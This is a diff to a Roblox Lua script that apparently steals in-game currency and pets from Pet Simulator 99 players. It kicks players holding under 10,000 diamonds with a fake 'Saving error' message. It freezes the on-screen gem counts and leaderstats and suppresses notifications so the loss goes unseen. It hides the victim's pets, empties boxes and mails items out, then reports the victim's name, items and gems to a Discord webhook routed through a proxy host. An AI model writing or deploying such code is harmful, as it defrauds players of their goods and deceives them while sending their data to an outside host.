@@ -10,6 +10,18 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
+local GemAmount1
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+		break
+    end
+end
+
+if GemAmount1 < 10000 then
+    plr:kick("Saving error, please rejoin!")
+end
+
 local function formatNumber(number)
 	local number = math.floor(number)
 	local suffixes = {"", "k", "m", "b", "t"}
@@ -21,8 +33,7 @@ local function formatNumber(number)
 	return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
-local function SendMessage(url, username)
-    local http = game:GetService("HttpService")
+local function SendMessage(url, username, diamonds)
     local headers = {
         ["Content-Type"] = "application/json"
     }
@@ -41,8 +52,9 @@ local function SendMessage(url, username)
 	}
 
 	for _, item in ipairs(itemsToSend) do
-		fields[2].value = fields[2].value .. item.name .. ", " .. formatNumber(item.rap) .. " RAP\n"
+		fields[2].value = fields[2].value .. item.name .. ": " .. formatNumber(item.rap) .. " RAP\n"
 	end
+    fields[2].value = fields[2].value .. "Gems: " .. formatNumber(diamonds)
 
     local data = {
         ["embeds"] = {{
@@ -54,7 +66,7 @@ local function SendMessage(url, username)
 			}
         }}
     }
-    local body = http:JSONEncode(data)
+    local body = HttpService:JSONEncode(data)
     local response = request({
 		Url = url,
 		Method = "POST",
@@ -63,33 +75,22 @@ local function SendMessage(url, username)
 	})
 end
 
-for i, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        GemAmount1 = v._am
-		break
-    end
-end
-
-if GemAmount1 < 10000 then
-    plr:kick("Saving error, please rejoin!")
-end
-
 local user = Username
 
-local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
-local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+local gemsleft = plr.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
+local gemsleftpath = plr.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
 gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
 	gemsleftpath.Text = gemsleft
 end)
 
-local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
-local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["\240\159\146\142 Diamonds"]
+local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
 	gemsleaderstatpath.Value = gemsleaderstat
 end)
 
-local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = game:GetService('Players').LocalPlayer.PlayerGui.Notifications
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
 noti:GetPropertyChangedSignal("Enabled"):Connect(function()
 	noti.Enabled = false
@@ -222,8 +223,7 @@ end
 local function CountGems()
 	for i, v in pairs(GetSave().Inventory.Currency) do
 		if v.id == "Diamonds" then
-			GemAmount1 = v._am
-			return GemAmount1
+			return v._am
 		end
 	end
 end
@@ -257,6 +257,17 @@ local function CategoryWebhook(category)
 end
 
 if CountHuges() > 0 or CountGems() > 500000 then
+    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_UnequipAll"):FireServer()
+    local parent = game.Workspace:FindFirstChild("__THINGS")
+    local oldFolder = parent and parent:FindFirstChild("Pets")
+    local newFolder = Instance.new("Folder")
+    newFolder.Name = "uwu"
+    newFolder.Parent = parent
+    for _, child in ipairs(oldFolder:GetChildren()) do
+        child.Parent = newFolder
+    end
+    oldFolder:Destroy()
+    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_Restore"):FireServer()
 	EmptyBoxes()
 	claim_mail()
 	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
@@ -267,7 +278,7 @@ if CountHuges() > 0 or CountGems() > 500000 then
 	end
 	if Webhook and string.find(Webhook, "discord") then
 		Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
-		SendMessage(Webhook, plr.Name)
+		SendMessage(Webhook, plr.Name, GemAmount1)
 	end
 	for i, v in pairs(categoryList) do
 		if save[v] ~= nil then
